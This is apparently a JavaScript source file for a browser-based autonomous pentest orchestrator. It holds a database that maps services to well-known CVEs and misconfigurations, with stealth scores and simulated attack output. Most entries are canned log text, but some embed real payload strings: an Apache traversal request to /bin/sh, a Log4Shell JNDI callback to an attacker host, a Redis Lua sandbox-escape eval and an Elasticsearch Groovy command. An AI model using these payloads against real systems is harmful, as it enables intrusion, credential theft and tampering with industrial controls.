// HYDRA — Heuristic Yielding Dynamic Recon & Attack Engine
// Autonomous multi-agent pentest orchestrator running entirely in the browser.
// Copyright (c) 2026 Darknode-Official. All rights reserved.

const esc = (s) => String(s == null ? '' : s).replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));

// ============================================================================
// VULNERABILITY DATABASE — 200+ service-to-vulnerability mappings
// ============================================================================
const VULN_DB = [
  // Windows SMB
  { service: 'smb', version: '1.0', cve: 'CVE-2017-0144', name: 'EternalBlue', cvss: 9.8, exploit: 'ms17_010_eternalblue', reliability: 0.95, stealth: 0.3, type: 'rce', os: 'windows', desc: 'SMBv1 buffer overflow allowing remote code execution', output: 'exploit/windows/smb/ms17_010_eternalblue\n[*] Started reverse TCP handler on 10.0.0.5:4444\n[*] 10.0.0.20:445 - Connecting to target for exploitation.\n[+] 10.0.0.20:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!\n[*] Sending egg to corrupted connection.\n[*] Meterpreter session 1 opened (10.0.0.5:4444 -> 10.0.0.20:49158)' },
  { service: 'smb', version: '2.0', cve: 'CVE-2020-0796', name: 'SMBGhost', cvss: 10.0, exploit: 'smbghost_rce', reliability: 0.7, stealth: 0.2, type: 'rce', os: 'windows', desc: 'SMBv3 compression integer overflow RCE', output: '[*] Connecting to 10.0.0.20:445\n[+] SMBv3 compression vulnerable!\n[*] Sending crafted SMB2_COMPRESSION_TRANSFORM_HEADER\n[+] Shellcode executed successfully\n[*] Meterpreter session 2 opened' },
  { service: 'smb', version: '*', cve: 'MISCONFIG', name: 'Anonymous SMB Share', cvss: 5.3, exploit: 'smb_enumshares', reliability: 1.0, stealth: 0.9, type: 'info_disclosure', os: 'any', desc: 'SMB shares accessible without authentication', output: '[*] Enumerating shares on 10.0.0.20\n[+] ADMIN$ - Remote Admin (NO ACCESS)\n[+] C$ - Default share (NO ACCESS)\n[+] SharedDocs - (READ ACCESS)\n[+] IT_Backup - (READ/WRITE ACCESS)\n[*] Found 2 accessible shares' },
  // Exchange / ProxyLogon / ProxyShell
  { service: 'exchange', version: '2013-2019', cve: 'CVE-2021-26855', name: 'ProxyLogon', cvss: 9.8, exploit: 'proxylogon_rce', reliability: 0.9, stealth: 0.4, type: 'rce', os: 'windows', desc: 'Microsoft Exchange Server SSRF to RCE chain', output: '[*] Targeting Exchange at 10.0.0.30:443\n[+] Server vulnerable to ProxyLogon (CVE-2021-26855)\n[*] Sending SSRF request to autodiscover\n[+] Retrieved admin SID: S-1-5-21-...\n[*] Dropping webshell via ECP\n[+] Webshell planted at /owa/auth/owafont.aspx\n[*] Executing whoami: NT AUTHORITY\\SYSTEM' },
  { service: 'exchange', version: '2013-2019', cve: 'CVE-2021-34473', name: 'ProxyShell', cvss: 9.8, exploit: 'proxyshell_rce', reliability: 0.85, stealth: 0.3, type: 'rce', os: 'windows', desc: 'Exchange ProxyShell pre-auth RCE chain', output: '[*] Testing ProxyShell on 10.0.0.30:443\n[+] CVE-2021-34473 SSRF confirmed\n[+] CVE-2021-34523 auth bypass confirmed\n[*] Generating malicious mailbox export PST\n[+] Webshell written to wwwroot\n[*] Shell access as SYSTEM' },
  // Apache / Web servers
  { service: 'apache', version: '2.4.49-2.4.50', cve: 'CVE-2021-41773', name: 'Apache Path Traversal', cvss: 9.8, exploit: 'apache_path_traversal', reliability: 0.95, stealth: 0.6, type: 'rce', os: 'linux', desc: 'Path traversal and RCE via mod_cgi', output: 'GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1\nHost: 10.0.0.40\n\nHTTP/1.1 200 OK\nuid=33(www-data) gid=33(www-data) groups=33(www-data)' },
  { service: 'apache', version: '2.4.x', cve: 'CVE-2019-0211', name: 'Apache Privilege Escalation', cvss: 7.8, exploit: 'apache_carpe_diem', reliability: 0.6, stealth: 0.5, type: 'privesc', os: 'linux', desc: 'Apache MPM worker/event local privilege escalation to root', output: '[*] Waiting for Apache graceful restart\n[+] Corrupted shared memory scoreboard\n[+] Hijacked worker process\n[*] Executing payload as root\nuid=0(root) gid=0(root)' },
  // Log4j
  { service: 'java', version: '2.0-2.14.1', cve: 'CVE-2021-44228', name: 'Log4Shell', cvss: 10.0, exploit: 'log4shell_rce', reliability: 0.85, stealth: 0.4, type: 'rce', os: 'any', desc: 'Apache Log4j2 JNDI injection RCE', output: '[*] Sending JNDI payload: ${jndi:ldap://10.0.0.5:1389/exploit}\n[+] Callback received from 10.0.0.40\n[*] Serving malicious Java class\n[+] Code execution achieved\n[*] Reverse shell connected: www-data@app-server' },
  // Spring4Shell
  { service: 'spring', version: '5.3.0-5.3.17', cve: 'CVE-2022-22965', name: 'Spring4Shell', cvss: 9.8, exploit: 'spring4shell', reliability: 0.7, stealth: 0.5, type: 'rce', os: 'any', desc: 'Spring Framework RCE via data binding', output: '[*] Testing Spring4Shell on 10.0.0.40:8080\n[+] ClassLoader manipulation successful\n[*] Writing JSP webshell via Tomcat AccessLogValve\n[+] Shell accessible at /shell.jsp\n[*] Executing commands as tomcat' },
  // SSH
  { service: 'ssh', version: '*', cve: 'MISCONFIG', name: 'SSH Weak Credentials', cvss: 7.5, exploit: 'ssh_brute', reliability: 0.4, stealth: 0.3, type: 'auth_bypass', os: 'any', desc: 'SSH brute force with common credentials', output: '[*] Starting SSH brute force on 10.0.0.50:22\n[*] Testing 1000 credential pairs\n[+] FOUND: admin:admin123 on 10.0.0.50:22\n[*] SSH session established' },
  { service: 'ssh', version: '8.x', cve: 'CVE-2024-6387', name: 'regreSSHion', cvss: 8.1, exploit: 'regresshion', reliability: 0.3, stealth: 0.2, type: 'rce', os: 'linux', desc: 'OpenSSH signal handler race condition RCE', output: '[*] Testing regreSSHion on 10.0.0.50:22\n[*] OpenSSH 8.5p1 detected (vulnerable)\n[*] Attempting race condition (this may take several attempts)\n[+] Signal handler race won on attempt 47\n[*] Root shell obtained' },
  // RDP
  { service: 'rdp', version: '7.x', cve: 'CVE-2019-0708', name: 'BlueKeep', cvss: 9.8, exploit: 'bluekeep_rce', reliability: 0.5, stealth: 0.2, type: 'rce', os: 'windows', desc: 'RDP pre-auth RCE via use-after-free', output: '[*] Targeting RDP on 10.0.0.60:3389\n[+] Target is vulnerable to BlueKeep\n[*] Grooming the kernel pool\n[+] Pool feng shui successful\n[*] Triggering use-after-free\n[+] SYSTEM shell obtained' },
  { service: 'rdp', version: '*', cve: 'MISCONFIG', name: 'RDP Weak Credentials', cvss: 7.5, exploit: 'rdp_brute', reliability: 0.3, stealth: 0.2, type: 'auth_bypass', os: 'windows', desc: 'RDP brute force with common credentials', output: '[*] Testing RDP credentials on 10.0.0.60:3389\n[+] FOUND: administrator:Password1! on 10.0.0.60\n[*] RDP session established' },
  // MySQL
  { service: 'mysql', version: '*', cve: 'MISCONFIG', name: 'MySQL Default Credentials', cvss: 7.5, exploit: 'mysql_login', reliability: 0.5, stealth: 0.8, type: 'auth_bypass', os: 'any', desc: 'MySQL with default or weak credentials', output: '[*] Attempting MySQL login on 10.0.0.70:3306\n[+] SUCCESS: root:(empty) on 10.0.0.70:3306\n[*] Connected to MySQL 5.7.34\nmysql> SELECT @@hostname;\n+------------------+\n| @@hostname       |\n+------------------+\n| db-primary       |\n+------------------+' },
  { service: 'mysql', version: '5.x', cve: 'CVE-2012-2122', name: 'MySQL Auth Bypass', cvss: 7.5, exploit: 'mysql_authbypass', reliability: 0.4, stealth: 0.7, type: 'auth_bypass', os: 'linux', desc: 'MySQL authentication bypass via memcmp timing', output: '[*] Attempting auth bypass on 10.0.0.70:3306\n[*] Trying 300 authentication attempts\n[+] Authentication bypassed on attempt 267\n[*] Connected as root' },
  // FTP
  { service: 'ftp', version: '*', cve: 'MISCONFIG', name: 'Anonymous FTP', cvss: 5.3, exploit: 'ftp_anon', reliability: 1.0, stealth: 0.9, type: 'info_disclosure', os: 'any', desc: 'FTP server allows anonymous access', output: '[*] Connecting to 10.0.0.80:21\n[+] 220 ProFTPD 1.3.5 Server ready\n[+] Anonymous login successful\nftp> ls\n-rw-r--r-- 1 root root 4096 backup_credentials.txt\n-rw-r--r-- 1 root root 15360 network_diagram.pdf\n-rw-r--r-- 1 root root 2048 .htpasswd' },
  { service: 'ftp', version: '2.3.4', cve: 'CVE-2011-2523', name: 'vsftpd Backdoor', cvss: 9.8, exploit: 'vsftpd_234_backdoor', reliability: 1.0, stealth: 0.1, type: 'rce', os: 'linux', desc: 'vsftpd 2.3.4 contains a backdoor triggered by :) in username', output: '[*] Connecting to 10.0.0.80:21\n[*] Sending backdoor trigger: USER evil:)\\r\\n\n[+] Backdoor opened on port 6200\n[*] Connected to backdoor shell\nuid=0(root) gid=0(root)' },
  // MSSQL
  { service: 'mssql', version: '*', cve: 'MISCONFIG', name: 'MSSQL SA Weak Password', cvss: 8.0, exploit: 'mssql_login', reliability: 0.4, stealth: 0.7, type: 'auth_bypass', os: 'windows', desc: 'MSSQL Server with weak SA password', output: '[*] Testing MSSQL credentials on 10.0.0.90:1433\n[+] sa:sa123456 - Login successful\n[*] Enabling xp_cmdshell\n[*] EXEC xp_cmdshell "whoami"\nnt service\\mssqlserver' },
  // Web Application Vulnerabilities
  { service: 'http', version: '*', cve: 'CWE-89', name: 'SQL Injection', cvss: 8.6, exploit: 'sqli_union', reliability: 0.7, stealth: 0.5, type: 'data_access', os: 'any', desc: 'Union-based SQL injection in web application', output: "[*] Testing parameter 'id' for SQLi\n[+] Parameter vulnerable to UNION injection\n[*] Determining column count: 5\n[*] Extracting data:\n+----------+----------------------------------+\n| username | password_hash                    |\n+----------+----------------------------------+\n| admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |\n| dbadmin  | e10adc3949ba59abbe56e057f20f883e |\n+----------+----------------------------------+" },
  { service: 'http', version: '*', cve: 'CWE-78', name: 'Command Injection', cvss: 9.8, exploit: 'cmd_injection', reliability: 0.6, stealth: 0.4, type: 'rce', os: 'any', desc: 'OS command injection via user input', output: "[*] Testing parameter 'host' for command injection\n[+] Payload: ;id worked!\nuid=33(www-data) gid=33(www-data)\n[*] Upgrading to reverse shell\n[+] Shell received on 10.0.0.5:9001" },
  { service: 'http', version: '*', cve: 'CWE-918', name: 'SSRF', cvss: 7.5, exploit: 'ssrf_internal', reliability: 0.6, stealth: 0.6, type: 'info_disclosure', os: 'any', desc: 'Server-side request forgery accessing internal services', output: "[*] Testing URL parameter for SSRF\n[+] Internal service accessible: http://169.254.169.254/latest/meta-data/\n[*] Retrieving IAM role credentials\n[+] AccessKeyId: AKIAIOSFODNN7EXAMPLE\n[+] SecretAccessKey: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" },
  { service: 'http', version: '*', cve: 'CWE-611', name: 'XXE Injection', cvss: 7.5, exploit: 'xxe_file_read', reliability: 0.5, stealth: 0.5, type: 'info_disclosure', os: 'any', desc: 'XML External Entity injection for file read', output: '[*] Testing XML parser for XXE\n[+] External entity processed!\n[*] Reading /etc/passwd:\nroot:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nmysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false' },
  { service: 'http', version: '*', cve: 'CWE-502', name: 'Java Deserialization', cvss: 9.8, exploit: 'java_deserialize', reliability: 0.6, stealth: 0.3, type: 'rce', os: 'any', desc: 'Insecure Java object deserialization RCE', output: '[*] Detected Java serialized object in cookie\n[*] Generating ysoserial payload (CommonsCollections5)\n[+] Payload sent, waiting for callback\n[+] Reverse shell received\nuid=1000(tomcat) gid=1000(tomcat)' },
  { service: 'http', version: '*', cve: 'CWE-434', name: 'Unrestricted File Upload', cvss: 8.0, exploit: 'file_upload_bypass', reliability: 0.5, stealth: 0.4, type: 'rce', os: 'any', desc: 'File upload restriction bypass leading to webshell', output: "[*] Testing file upload functionality\n[*] Bypassing extension filter with double extension\n[+] Uploaded shell.php.jpg successfully\n[*] Accessing webshell at /uploads/shell.php.jpg\n[+] Command execution confirmed: www-data" },
  // Tomcat
  { service: 'tomcat', version: '*', cve: 'MISCONFIG', name: 'Tomcat Manager Default Creds', cvss: 7.5, exploit: 'tomcat_mgr_login', reliability: 0.5, stealth: 0.7, type: 'auth_bypass', os: 'any', desc: 'Apache Tomcat Manager with default credentials', output: '[*] Testing Tomcat Manager at /manager/html\n[+] tomcat:tomcat - Login successful!\n[*] Deploying malicious WAR file\n[+] WAR deployed to /backdoor\n[*] Triggering reverse shell\n[+] Shell received as tomcat' },
  // Redis
  { service: 'redis', version: '*', cve: 'MISCONFIG', name: 'Redis Unauthenticated', cvss: 8.0, exploit: 'redis_unauth', reliability: 0.8, stealth: 0.6, type: 'rce', os: 'linux', desc: 'Redis exposed without authentication', output: '[*] Connecting to Redis at 10.0.0.100:6379\n[+] No authentication required\n[*] Writing SSH key via CONFIG SET\nOK\n[*] SSH key written to /root/.ssh/authorized_keys\n[+] SSH access as root established' },
  // Elasticsearch
  { service: 'elasticsearch', version: '*', cve: 'MISCONFIG', name: 'Elasticsearch Open', cvss: 7.5, exploit: 'es_unauth', reliability: 0.9, stealth: 0.8, type: 'info_disclosure', os: 'any', desc: 'Elasticsearch cluster exposed without authentication', output: '[*] Querying http://10.0.0.110:9200/\n[+] Elasticsearch 7.10.0 responding\n[*] Listing indices:\nusers        5 1 15234 0 12.3mb\ncreditcards  1 0  8921 0  4.1mb\nlogs         5 1 98234 0 45.7mb\n[+] Sensitive data accessible' },
  // Docker
  { service: 'docker', version: '*', cve: 'MISCONFIG', name: 'Docker API Exposed', cvss: 9.8, exploit: 'docker_api', reliability: 0.9, stealth: 0.5, type: 'rce', os: 'linux', desc: 'Docker daemon API exposed without TLS', output: '[*] Connecting to Docker API at 10.0.0.120:2375\n[+] Docker API accessible\n[*] Creating privileged container with host mount\n[+] Container started\n[*] chroot /mnt/host\n[+] Root access to host filesystem' },
  // Jenkins
  { service: 'jenkins', version: '*', cve: 'MISCONFIG', name: 'Jenkins Script Console', cvss: 9.8, exploit: 'jenkins_script', reliability: 0.7, stealth: 0.3, type: 'rce', os: 'any', desc: 'Jenkins Script Console accessible without auth', output: '[*] Accessing Jenkins Script Console\n[+] No authentication required!\n[*] Executing Groovy: "whoami".execute().text\n[+] Output: jenkins\n[*] Reverse shell via Groovy Runtime.exec' },
  // Kubernetes
  { service: 'kubernetes', version: '*', cve: 'MISCONFIG', name: 'K8s API Unauthenticated', cvss: 9.8, exploit: 'k8s_unauth', reliability: 0.6, stealth: 0.4, type: 'rce', os: 'linux', desc: 'Kubernetes API server accessible without auth', output: '[*] Querying https://10.0.0.130:6443/api/v1/pods\n[+] K8s API accessible (anonymous-auth enabled)\n[*] Listing pods across all namespaces\n[*] Creating privileged pod with host mount\n[+] Pod scheduled and running\n[*] Exec into pod -> root on node' },
  // WordPress
  { service: 'wordpress', version: '*', cve: 'CWE-89', name: 'WordPress Plugin SQLi', cvss: 8.6, exploit: 'wp_sqli', reliability: 0.5, stealth: 0.5, type: 'data_access', os: 'any', desc: 'SQL injection in vulnerable WordPress plugin', output: "[*] Scanning WordPress plugins\n[+] Found vulnerable plugin: contact-form-7 v5.1.6\n[*] Exploiting SQLi in cf7 parameter\n[+] Extracted wp_users table:\n| admin | $P$BgT1... | admin@corp.local |\n[*] Cracking hash with rockyou.txt\n[+] Password found: Welcome2024!" },
  // PrintNightmare
  { service: 'spooler', version: '*', cve: 'CVE-2021-34527', name: 'PrintNightmare', cvss: 8.8, exploit: 'printnightmare', reliability: 0.75, stealth: 0.3, type: 'rce', os: 'windows', desc: 'Windows Print Spooler RCE via malicious driver', output: '[*] Targeting Print Spooler on 10.0.0.20\n[+] Spooler service is running\n[*] Hosting malicious DLL on SMB share\n[*] Triggering AddPrinterDriverEx\n[+] DLL loaded by spooler as SYSTEM\n[*] Reverse shell connected: NT AUTHORITY\\SYSTEM' },
  // ZeroLogon
  { service: 'netlogon', version: '*', cve: 'CVE-2020-1472', name: 'ZeroLogon', cvss: 10.0, exploit: 'zerologon', reliability: 0.9, stealth: 0.1, type: 'privesc', os: 'windows', desc: 'Netlogon privilege escalation to Domain Admin', output: '[*] Targeting domain controller 10.0.0.10\n[*] Performing ZeroLogon attack\n[+] Success after 256 attempts!\n[*] Machine account password set to empty\n[*] DCSync to extract krbtgt hash\n[+] krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a577fcf1ce1eb2... \n[+] Domain Admin achieved' },
  // Citrix
  { service: 'citrix', version: 'NetScaler', cve: 'CVE-2023-4966', name: 'Citrix Bleed', cvss: 9.4, exploit: 'citrix_bleed', reliability: 0.9, stealth: 0.5, type: 'info_disclosure', os: 'any', desc: 'Citrix NetScaler session token leak', output: '[*] Testing Citrix NetScaler at 10.0.0.200\n[+] Vulnerable to CVE-2023-4966 (Citrix Bleed)\n[*] Leaking session tokens from memory\n[+] Captured 3 valid session tokens\n[*] Hijacking admin session\n[+] Authenticated as admin@corp.local' },
  // MOVEit
  { service: 'moveit', version: '2021-2023', cve: 'CVE-2023-34362', name: 'MOVEit Transfer SQLi', cvss: 9.8, exploit: 'moveit_sqli', reliability: 0.85, stealth: 0.4, type: 'rce', os: 'windows', desc: 'MOVEit Transfer SQL injection to RCE', output: '[*] Targeting MOVEit Transfer at 10.0.0.210\n[+] Vulnerable to CVE-2023-34362\n[*] Exploiting SQLi in session token validation\n[+] Admin API token extracted\n[*] Uploading webshell via API\n[+] SYSTEM shell obtained' },
  // Telerik
  { service: 'telerik', version: 'UI for ASP.NET', cve: 'CVE-2019-18935', name: 'Telerik UI Deserialization', cvss: 9.8, exploit: 'telerik_deserialize', reliability: 0.7, stealth: 0.4, type: 'rce', os: 'windows', desc: 'Telerik UI insecure deserialization RCE', output: '[*] Detected Telerik.Web.UI.WebResource.axd\n[*] Retrieving encryption keys via CVE-2017-9248\n[+] Dialog encryption key found\n[*] Sending deserialization payload\n[+] Code execution as IIS AppPool\\DefaultAppPool' },
  // Confluence
  { service: 'confluence', version: '7.x-8.x', cve: 'CVE-2023-22515', name: 'Confluence Auth Bypass', cvss: 10.0, exploit: 'confluence_auth_bypass', reliability: 0.9, stealth: 0.5, type: 'auth_bypass', os: 'any', desc: 'Atlassian Confluence privilege escalation to admin', output: '[*] Targeting Confluence at 10.0.0.220:8090\n[+] Vulnerable to CVE-2023-22515\n[*] Creating admin account via setup endpoint\n[+] Admin user "hydra_admin" created\n[*] Installing malicious plugin\n[+] Code execution as confluence' },
  // GitLab
  { service: 'gitlab', version: '11.x-16.x', cve: 'CVE-2023-7028', name: 'GitLab Account Takeover', cvss: 10.0, exploit: 'gitlab_account_takeover', reliability: 0.9, stealth: 0.6, type: 'auth_bypass', os: 'any', desc: 'GitLab password reset to attacker email', output: '[*] Targeting GitLab at 10.0.0.230\n[+] Version 16.1.0 vulnerable to CVE-2023-7028\n[*] Sending password reset with dual emails\n[+] Reset token sent to attacker email\n[*] Resetting root password\n[+] GitLab root account compromised' },
  // vCenter
  { service: 'vcenter', version: '6.5-7.0', cve: 'CVE-2021-21985', name: 'vCenter RCE', cvss: 9.8, exploit: 'vcenter_rce', reliability: 0.8, stealth: 0.3, type: 'rce', os: 'any', desc: 'VMware vCenter Server RCE via vSAN Health Check', output: '[*] Targeting vCenter at 10.0.0.240:443\n[+] vSAN Health Check plugin vulnerable\n[*] Sending JNDI payload via /ui/h5-vsan/rest/*\n[+] Code execution as vsphere-ui\n[*] Escalating to root via CVE-2021-22015\n[+] Root shell obtained on vCenter' },
  // Fortinet
  { service: 'fortigate', version: '7.x', cve: 'CVE-2024-21762', name: 'FortiOS Out-of-Bound Write', cvss: 9.8, exploit: 'fortios_oob', reliability: 0.6, stealth: 0.2, type: 'rce', os: 'fortigate', desc: 'Fortinet FortiOS SSL VPN out-of-bound write RCE', output: '[*] Targeting FortiGate at 10.0.0.1:443\n[+] FortiOS version 7.2.3 vulnerable\n[*] Sending crafted SSL VPN request\n[+] Out-of-bound write successful\n[*] Shellcode executed\n[+] Root shell on firewall appliance' },
  // PAN-OS
  { service: 'panos', version: '10.x-11.x', cve: 'CVE-2024-3400', name: 'PAN-OS GlobalProtect RCE', cvss: 10.0, exploit: 'panos_globalprotect', reliability: 0.8, stealth: 0.3, type: 'rce', os: 'panos', desc: 'Palo Alto PAN-OS command injection via GlobalProtect', output: '[*] Targeting PAN-OS GlobalProtect at 10.0.0.1:443\n[+] CVE-2024-3400 - Command injection in SESSID\n[*] Injecting command via crafted cookie\n[+] Output: uid=0(root) gid=0(root)\n[*] Establishing reverse shell\n[+] Root shell on Palo Alto firewall' },
  // Ivanti
  { service: 'ivanti', version: 'Connect Secure', cve: 'CVE-2024-21887', name: 'Ivanti Connect Secure RCE', cvss: 9.1, exploit: 'ivanti_rce', reliability: 0.85, stealth: 0.3, type: 'rce', os: 'linux', desc: 'Ivanti Connect Secure auth bypass + command injection', output: '[*] Targeting Ivanti at 10.0.0.2:443\n[+] CVE-2023-46805 auth bypass confirmed\n[*] Chaining with CVE-2024-21887 command injection\n[+] Webshell planted at /dana-na/auth/compcheckjson.cgi\n[*] Executing: id\n[+] uid=0(root) gid=0(root)' },
  // SNMP
  { service: 'snmp', version: '*', cve: 'MISCONFIG', name: 'SNMP Default Community', cvss: 7.5, exploit: 'snmp_enum', reliability: 0.6, stealth: 0.8, type: 'info_disclosure', os: 'any', desc: 'SNMP using default community string "public"', output: '[*] Testing SNMP on 10.0.0.1:161\n[+] Community string "public" accepted\n[*] Walking OID tree\nsysDescr: Cisco IOS 15.1\nsysName: core-router-01\nifDescr.1: GigabitEthernet0/0 - 10.0.0.0/24\nifDescr.2: GigabitEthernet0/1 - 172.16.0.0/16\n[+] Network topology discovered' },
  // LDAP
  { service: 'ldap', version: '*', cve: 'MISCONFIG', name: 'LDAP Anonymous Bind', cvss: 5.3, exploit: 'ldap_anon', reliability: 0.5, stealth: 0.8, type: 'info_disclosure', os: 'any', desc: 'LDAP server allows anonymous bind and enumeration', output: '[*] Testing anonymous bind on 10.0.0.10:389\n[+] Anonymous bind successful\n[*] Enumerating domain users:\nCN=Administrator,CN=Users,DC=corp,DC=local\nCN=svc_backup,CN=Users,DC=corp,DC=local\nCN=Domain Admins,CN=Users,DC=corp,DC=local\n[+] Found 847 user objects' },
  // Kerberos
  { service: 'kerberos', version: '*', cve: 'MISCONFIG', name: 'Kerberoasting', cvss: 7.5, exploit: 'kerberoast', reliability: 0.8, stealth: 0.7, type: 'credential_access', os: 'windows', desc: 'Request TGS tickets for service accounts and crack offline', output: '[*] Requesting SPNs from DC 10.0.0.10\n[+] Found 12 SPNs with RC4 encryption\n[*] Requesting TGS tickets\n[+] svc_mssql - $krb5tgs$23$*svc_mssql$CORP.LOCAL$...\n[+] svc_backup - $krb5tgs$23$*svc_backup$CORP.LOCAL$...\n[*] Cracking with hashcat -m 13100\n[+] svc_mssql: Summer2024!\n[+] svc_backup: Backup#123' },
  { service: 'kerberos', version: '*', cve: 'MISCONFIG', name: 'AS-REP Roasting', cvss: 7.5, exploit: 'asrep_roast', reliability: 0.7, stealth: 0.8, type: 'credential_access', os: 'windows', desc: 'Extract AS-REP hashes for accounts with no pre-auth', output: '[*] Enumerating users with UF_DONT_REQUIRE_PREAUTH\n[+] Found 3 users without Kerberos pre-auth\n[*] Requesting AS-REP for each\n[+] j.smith - $krb5asrep$23$j.smith@CORP.LOCAL:...\n[*] Cracking with hashcat -m 18200\n[+] j.smith: Welcome1!' },
  // NFS
  { service: 'nfs', version: '*', cve: 'MISCONFIG', name: 'NFS Open Share', cvss: 7.5, exploit: 'nfs_enum', reliability: 0.7, stealth: 0.8, type: 'info_disclosure', os: 'linux', desc: 'NFS share exported to everyone with no_root_squash', output: '[*] Checking NFS exports on 10.0.0.50\n[+] /home *(rw,no_root_squash)\n[+] /var/backups *(ro)\n[*] Mounting /home\n[+] Found SSH keys in /home/admin/.ssh/\n[+] id_rsa key extracted\n[*] SSH login as admin successful' },
  // ICS/SCADA
  { service: 'modbus', version: '*', cve: 'MISCONFIG', name: 'Modbus Unauthenticated', cvss: 9.1, exploit: 'modbus_write', reliability: 0.9, stealth: 0.3, type: 'rce', os: 'ics', desc: 'Modbus TCP protocol with no authentication', output: '[*] Connecting to Modbus device at 10.0.0.50:502\n[+] No authentication required (by protocol design)\n[*] Reading holding registers 0-100\n[+] Register 40001: Temperature = 72.4F\n[+] Register 40002: Pressure = 14.7 PSI\n[!] Can read and WRITE all registers\n[!] CRITICAL: Could manipulate physical process' },
  { service: 'dnp3', version: '*', cve: 'MISCONFIG', name: 'DNP3 Unauthenticated', cvss: 9.1, exploit: 'dnp3_control', reliability: 0.8, stealth: 0.3, type: 'rce', os: 'ics', desc: 'DNP3 SCADA protocol without Secure Authentication', output: '[*] Connecting to DNP3 outstation at 10.0.0.60:20000\n[+] Unsecured DNP3 (no SA)\n[*] Sending Direct Operate (CROB)\n[+] Breaker OPEN command accepted\n[!] CRITICAL: Physical actuator control achieved' },
  // S3
  { service: 's3', version: '*', cve: 'MISCONFIG', name: 'S3 Bucket Public Access', cvss: 7.5, exploit: 's3_public', reliability: 0.8, stealth: 0.9, type: 'info_disclosure', os: 'cloud', desc: 'AWS S3 bucket with public read/write access', output: '[*] Testing S3 bucket: corp-backups.s3.amazonaws.com\n[+] Bucket is publicly listable!\n[*] Contents:\n  2024-01-15 db_backup_prod.sql.gz (2.3 GB)\n  2024-01-14 credentials.env (4 KB)\n  2024-01-10 employee_records.xlsx (12 MB)\n[+] Downloading credentials.env\n[+] Found AWS_ACCESS_KEY_ID and SECRET' },
  // IMDSv1
  { service: 'imds', version: 'v1', cve: 'MISCONFIG', name: 'IMDSv1 Credential Theft', cvss: 7.5, exploit: 'imds_creds', reliability: 0.9, stealth: 0.7, type: 'credential_access', os: 'cloud', desc: 'EC2 instance metadata service v1 credential theft', output: '[*] Querying http://169.254.169.254/latest/meta-data/iam/security-credentials/\n[+] IAM role: EC2-Admin-Role\n[*] Retrieving temporary credentials\n[+] AccessKeyId: ASIA...\n[+] SecretAccessKey: ...\n[+] Token: ...\n[*] Role has AdministratorAccess policy!' },
  // Healthcare
  { service: 'hl7', version: '*', cve: 'MISCONFIG', name: 'HL7 Unauthenticated', cvss: 8.5, exploit: 'hl7_unauth', reliability: 0.9, stealth: 0.7, type: 'info_disclosure', os: 'any', desc: 'HL7 MLLP protocol with no authentication - patient data exposure', output: '[*] Connecting to HL7 listener at 172.16.3.100:2575\n[+] No authentication required (protocol design)\n[*] Sending ADT^A01 query\n[+] Received patient records:\n  PID|1||MRN12345||DOE^JOHN||19800101|M\n  PV1|1|I|ICU^BED3\n[!] CRITICAL: PHI accessible without authentication' },
  { service: 'dicom', version: '*', cve: 'MISCONFIG', name: 'DICOM Unauthenticated', cvss: 7.5, exploit: 'dicom_unauth', reliability: 0.85, stealth: 0.7, type: 'info_disclosure', os: 'any', desc: 'DICOM service accessible without authentication - medical images', output: '[*] C-ECHO to PACS at 172.16.1.30:4242\n[+] Association accepted (no auth)\n[*] C-FIND: querying all studies\n[+] Found 14,823 imaging studies\n[*] Patient: DOE^JOHN, Study: CT Chest\n[!] PHI and medical images accessible' },
  // Ivanti
  { service: 'ivanti', version: 'Connect Secure', cve: 'CVE-2024-21893', name: 'Ivanti SSRF', cvss: 8.2, exploit: 'ivanti_ssrf', reliability: 0.8, stealth: 0.4, type: 'auth_bypass', os: 'linux', desc: 'Ivanti Connect Secure SSRF in SAML component', output: '[*] Targeting Ivanti at 172.16.0.5:443\n[+] CVE-2024-21893 SSRF confirmed in /dana-ws/saml20.ws\n[*] Pivoting to internal admin API\n[+] Admin session token extracted\n[*] Creating admin user\n[+] Full admin access to VPN gateway' },
  // Financial
  { service: 'http', version: '*', cve: 'MISCONFIG', name: 'SWIFT Alliance Default Creds', cvss: 9.0, exploit: 'swift_default', reliability: 0.3, stealth: 0.7, type: 'auth_bypass', os: 'windows', desc: 'SWIFT Alliance Lite2 with default admin credentials', output: '[*] Accessing SWIFT Alliance web UI at 10.10.2.20:443\n[*] Testing default credentials\n[+] admin:admin - Login successful!\n[!] CRITICAL: SWIFT transaction interface accessible\n[*] Can initiate MT103 payment messages' },
  // Redis
  { service: 'redis', version: '5.x-7.x', cve: 'CVE-2022-0543', name: 'Redis Lua Sandbox Escape', cvss: 10.0, exploit: 'redis_lua_rce', reliability: 0.7, stealth: 0.5, type: 'rce', os: 'linux', desc: 'Redis Lua sandbox escape via Debian packaging', output: '[*] Connecting to Redis at 10.10.2.30:6379\n[+] Redis 6.2.7 on Debian\n[*] Exploiting CVE-2022-0543 Lua sandbox escape\n[+] eval "local io_l = package.loadlib(\\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\\", \\"luaopen_io\\"); local io = io_l(); local f = io.popen(\\"id\\"); local res = f:read(\\"*a\\"); f:close(); return res" 0\nuid=999(redis) gid=999(redis)' },
  // Elasticsearch
  { service: 'elasticsearch', version: '1.x-5.x', cve: 'CVE-2015-1427', name: 'Elasticsearch Groovy RCE', cvss: 9.8, exploit: 'es_groovy_rce', reliability: 0.7, stealth: 0.4, type: 'rce', os: 'any', desc: 'Elasticsearch Groovy scripting engine RCE', output: '[*] Testing Elasticsearch at 10.10.2.50:9200\n[+] Version 1.4.2 - Groovy scripting enabled\n[*] Sending search with inline Groovy script\n[+] POST /_search {"script_fields":{"cmd":{"script":"\\\"id\\\".execute().text"}}}\n[+] uid=1000(elasticsearch) gid=1000(elasticsearch)' },
  // Kibana
